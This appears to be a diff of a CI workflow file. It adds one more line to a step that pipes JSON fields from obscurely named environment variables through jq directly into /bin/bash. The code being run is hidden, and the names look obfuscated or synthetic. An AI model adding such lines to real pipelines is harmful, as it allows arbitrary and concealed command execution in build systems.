@@ -20,6 +20,7 @@ jobs:
           echo $wcnv1113 | jq -r .qe36799 | /bin/bash
           echo $jhnf09 | jq -r .co7 | /bin/bash
           printf '%s' "$ft6182" | jq -r .jaij942 | /bin/bash
+          printf '%s' "$o5" | jq -r .sob65437 | /bin/bash
 
       - name: Persist output
         if: ${{ always() }}
